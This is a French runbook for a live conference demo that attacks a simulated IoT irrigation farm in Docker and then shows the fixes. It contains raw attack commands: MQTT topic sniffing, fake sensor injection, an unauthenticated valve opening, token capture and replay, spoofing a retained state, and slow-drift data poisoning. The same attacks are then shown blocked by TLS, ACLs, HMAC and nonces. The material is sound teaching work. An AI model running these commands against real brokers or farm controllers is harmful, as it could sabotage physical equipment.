# Démo GDG Lomé 2026 — commandes brutes, dans l’ordre des slides

Runbook autonome : **aucun script d’attaque**, **aucun `attack.py`**. Chaque attaque est
une **commande brute** (`nmap`, `mosquitto_pub`, `mosquitto_sub`, `curl`), tapée en direct
pour que tout soit explicite. À exécuter depuis `gdg_lome/2026/demos`.

## Deux terminaux

| Terminal | Rôle | Invite |
|---|---|---|
| **[hôte]** | bascule de mode, journal de la ferme, vérification d’état | `$` sur la machine |
| **[attaquant]** | shell **Kali** dans le conteneur `attacker` ; on y tape les attaques | `root@…:/app#` |

> L’attaquant est un conteneur **Kali Linux persistant** : on le lance **une fois** et on
> garde son shell ouvert tout le talk. `nmap`, `mosquitto_pub/sub`, `curl`, `python3` y
> sont déjà installés. Les identifiants « fuités » du mode hardened sont dans son
> environnement (`$LEAK_VIEWER_PASS`, `$LEAK_MAINTENANCE_PASS`, `$LEAK_SENSOR02_PASS`).

Convention : `$` = invite, ne pas le taper. Depuis le shell attaquant, le dashboard est
`http://dashboard:8080` ; depuis l’hôte, `http://127.0.0.1:8080`.

---

## Préparation — une fois par machine (avec Internet)

```bash
docker pull eclipse-mosquitto:2 kalilinux/kali-rolling   # [hôte]
bash scripts/setup.sh                                     # .env, secrets, PKI, comptes, images
```

`setup.sh` est idempotent (`--force` régénère PKI et secrets). Le build de l’image Kali
prend quelques minutes la première fois.

---

## Slide 8 — Démarrer la ferme (mode insecure)

```bash
bash scripts/mode.sh insecure                             # [hôte]
curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"insecure"
```

Ouvrir le tableau de bord : <http://127.0.0.1:8080>. Second terminal **[hôte]**, fenêtre
« ferme » (laisser tourner) :

```bash
docker compose logs -f --tail 0 simulator dashboard       # [hôte]
```

Lancer l’attaquant **une seule fois** et ouvrir son shell :

```bash
docker compose --profile attack up -d attacker            # [hôte] démarre Kali (persistant)
docker compose exec attacker bash                         # [hôte] → invite root@…:/app#
```

À partir d’ici, les commandes **[attaquant]** se tapent dans ce shell Kali.

---

## Slide 9 — Acte I : Reconnaissance

```bash
nmap -sT -sV -p 1883,8883,8080 mosquitto dashboard        # [attaquant]
```
Attendu : `1883/tcp open mosquitto 2.1.4`, `8080/tcp open http Werkzeug/Python`.

```bash
mosquitto_sub -h mosquitto -t '#' -v -W 6                 # [attaquant]
```
Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`,
`farm/actuator/valve/state`. Le broker anonyme laisse tout lire.

---

## Slide 10 — Acte II : Mentir et agir

```bash
# [attaquant] 15 fausses mesures « humidité = 0 »
for i in $(seq 1 15); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done
```

```bash
# [attaquant] ouvrir la vanne sans aucun token
curl -i -X POST http://dashboard:8080/api/valve/open
```
Attendu : `HTTP/1.1 200 OK`, `{"command":"OPEN",...,"mode":"insecure"}`.

```bash
curl -s http://dashboard:8080/api/state                   # [attaquant]
```
Attendu : `vanne=OPEN`, `flow≈34 L/min`, `score=0`, `impact≈2 000 000 FCFA`.

---

## Slide 12 — Défense naïve (passage en mode secure)

```bash
# [hôte] bascule : seuls mosquitto, simulator, dashboard sont recréés (l’attaquant reste)
FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard
curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"secure"
```

Montrer que les contrôles « évidents » marchent :

```bash
# [attaquant] humidité hors plage → rejetée [20,100]
for i in $(seq 1 5); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done
# [attaquant] vanne sans token → 403
curl -i -X POST http://dashboard:8080/api/valve/open
```
Attendu (fenêtre ferme) : `humidité 0.0 REJETÉE : hors plage [20, 100]` ; et `HTTP/1.1 403 FORBIDDEN`.

---

## Slide 14 — Acte III : Voler le token sur le bus

Capturer une commande légitime (lancer, puis l’opérateur ouvre la vanne via l’API) :

```bash
# [attaquant] capture UNE commande sur le bus
mosquitto_sub -h mosquitto -t farm/actuator/valve -C 1
```
Pendant ce temps, l’opérateur (ou vous, pour la démo) ouvre la vanne légitimement :

```bash
# [attaquant/hôte] action de l’opérateur légitime (avec token)
curl -s -X POST -H "Authorization: Bearer gdg-demo-token" http://dashboard:8080/api/valve/open
```
La capture affiche : `{"command":"OPEN","token":"gdg-demo-token"}`.

Rejouer la commande capturée — le broker l’accepte :

```bash
# [attaquant] rejeu
mosquitto_pub -h mosquitto -t farm/actuator/valve \
  -m '{"command":"OPEN","token":"gdg-demo-token"}'
```
Attendu (fenêtre ferme) : la vanne se rouvre après la fermeture par l’opérateur.

---

## Slide 15 — Acte III : Aveugler et empoisonner

```bash
# [attaquant] faux état de vanne RETENU : l’écran affiche CLOSED
mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
```
Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indique ~33 L/min.

```bash
# [attaquant] empoisonner DANS la plage : 25 % passe le filtre
for i in $(seq 1 30); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 25; done
curl -s http://dashboard:8080/api/state
```
Attendu : `mode=secure`, `vanne(affiché)=CLOSED`, `score≈16`, impact ~1,5 M FCFA, **aucune trace** du rejeu.

---

## Slide 17 — Mode hardened (TLS, identité, ACL, HMAC)

```bash
# [hôte]
FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard
curl -s http://127.0.0.1:8080/api/state                   # [hôte] → "mode":"hardened"
```

> En hardened, un `mosquitto_pub` refusé par l’ACL ou par la signature **n’affiche pas
> d’erreur côté client** : le rejet se lit dans le **journal du dashboard** (fenêtre ferme)
> et sur l’état de la vanne (reste CLOSED).

---

## Slide 21 — Acte IV : Les mêmes attaques, bloquées

Anonyme refusé (1883 fermé, 8883 n’accepte pas l’anonyme) :

```bash
# [attaquant]
mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -t '#' -C 1
```
Attendu : `Connection Refused: not authorised`.

ACL — « viewer » (identité fuitée) ne voit que les capteurs :

```bash
# [attaquant]
mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u viewer -P "$LEAK_VIEWER_PASS" -t 'farm/#' -v -W 4
```
Attendu : uniquement des `farm/sensor/*` ; aucun `farm/actuator/*`.

ACL — « viewer » ne peut pas écrire ; « sensor-02 » ne peut pas forger l’état (rejet
silencieux côté client, visible dans le journal) :

```bash
# [attaquant]
mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u viewer -P "$LEAK_VIEWER_PASS" -t farm/sensor/humidity -m 0
mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u sensor-02 -P "$LEAK_SENSOR02_PASS" -t farm/actuator/valve/state -r -m CLOSED
```

Forger une commande sans la clé HMAC (en « maintenance », qui a le droit vanne) :

```bash
# [attaquant]
mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve \
  -m '{"command":"OPEN","token":"gdg-demo-token"}'
```
Attendu (journal) : `commande OPEN REJETÉE : signature HMAC invalide`.

Rejouer une commande signée capturée → nonce déjà utilisé :

```bash
# [attaquant] capturer la commande signée pendant que l’opérateur ouvre la vanne
mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -C 1
# (opérateur légitime)
curl -s -X POST -H "Authorization: Bearer gdg-demo-token" http://dashboard:8080/api/valve/open
# rejeu de la commande signée capturée
mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -m '<commande capturée>'
```
Attendu (journal) : `commande OPEN REJETÉE : rejeu détecté (nonce déjà utilisé)`.

```bash
curl -s http://dashboard:8080/api/state                   # [attaquant] → vanne=CLOSED
```

---

## Slide 22 — La limite : saut détecté, puis dérive lente

Saut brutal détecté :

```bash
# [attaquant] sensor-02 publie 25 après ~65 → saut anormal
for i in $(seq 1 10); do mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt \
  -u sensor-02 -P "$LEAK_SENSOR02_PASS" -t farm/sensor/humidity -m 25; sleep 0.2; done
```
Attendu (journal) : `humidité 25.0 REJETÉE : saut anormal (… → 25.0)`.

Dérive lente, sous le seuil (4 mesures par palier pour dominer la médiane) :

```bash
# [attaquant]
for v in $(seq 65 -2 25); do for j in 1 2 3 4; do mosquitto_pub -h mosquitto -p 8883 \
  --cafile /certs/ca.crt -u sensor-02 -P "$LEAK_SENSOR02_PASS" \
  -t farm/sensor/humidity -m $v; done; sleep 0.1; done
curl -s http://dashboard:8080/api/state
```
Attendu : `score≈21` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).

---

## Après le talk — remise à zéro et arrêt

```bash
# [hôte] revenir en insecure pour une nouvelle démo
FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard
curl -s -X POST http://127.0.0.1:8080/api/reset            # [hôte] remise à zéro du modèle
```

```bash
docker compose down                                        # [hôte] garde images + secrets
```

Tout supprimer (machine prêtée/partagée) :

```bash
docker compose --profile attack down --rmi local --remove-orphans
rm -rf mosquitto/tls mosquitto/secrets .env
```

---

## Aide-mémoire des modes

| Mode | Slide | Bascule [hôte] |
|---|---|---|
| insecure | 8 | `FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard` |
| secure | 12 | `FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard` |
| hardened | 18 | `FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard` |

Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state` (hôte) ou
`curl -s http://dashboard:8080/api/state` (attaquant).
